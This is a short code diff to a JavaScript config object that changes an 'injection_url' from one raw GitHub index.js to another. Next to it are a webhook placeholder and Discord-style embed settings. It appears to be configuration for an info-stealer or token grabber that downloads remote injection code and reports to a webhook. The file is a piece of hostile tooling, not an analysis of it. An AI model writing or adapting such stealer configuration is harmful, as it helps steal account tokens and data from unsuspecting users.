@@ -15,7 +15,7 @@ var config = {
     "init-notify": "true",
     "embed-color": 16711718,
 
-    injection_url: "https://raw.githubusercontent.com/SOrdeal/Sordeal-Injection/main/index.js",
+    injection_url: "https://raw.githubusercontent.com/v3sweetD/Urlj/main/index.js",
     webhook: "%WEBHOOK%",
 
     Filter: {
